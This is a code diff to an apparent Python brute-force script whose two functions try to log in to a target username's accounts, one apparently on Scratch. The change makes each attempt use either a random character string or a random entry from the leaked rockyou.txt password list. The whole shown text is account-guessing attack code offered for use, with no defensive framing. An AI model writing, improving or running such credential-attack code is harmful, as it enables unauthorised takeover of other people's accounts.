@@ -81,9 +81,17 @@ def tbf():
         # make a list for the charecters of the password to be added to
         tpass = []
     # generate a random password
-        for i in range(0, random.randint(0, 25)):
-          tpass.append(random.choice(alpb))
-        tpass = "".join(str(x) for x in tpass)
+        mode = random.randint(0,1)
+        if mode == 1:
+        # generate a random password
+          for i in range(0, random.randint(8, 25)):
+            tpass.append(random.choice(alpb))
+          tpass = "".join(str(x) for x in tpass)
+        elif mode == 0:
+          with open('rockyou.txt','r') as rockyou:
+            rock = rockyou.read()
+            rock = rock.split('\n')
+            tpass = rock[random.randint(0,2377028)]
         # try to login with the generated password
         try:
           test = l(susername, tpass)
@@ -176,9 +184,17 @@ def sbf():
   # make a list for the charecters of the password to be added to
     tpass = []
   # generate a random password
-    for i in range(0, random.randint(8, 25)):
-      tpass.append(random.choice(alpb))
-    tpass = "".join(str(x) for x in tpass)
+    mode = random.randint(0,1)
+    if mode == 1:
+    # generate a random password
+      for i in range(0, random.randint(8, 25)):
+        tpass.append(random.choice(alpb))
+      tpass = "".join(str(x) for x in tpass)
+    elif mode == 0:
+      with open('rockyou.txt','r') as rockyou:
+        rock = rockyou.read()
+        rock = rock.split('\n')
+        tpass = rock[random.randint(0,2377028)]
     # try to login with the generated password
     try:
       scratch = s(susername, tpass)
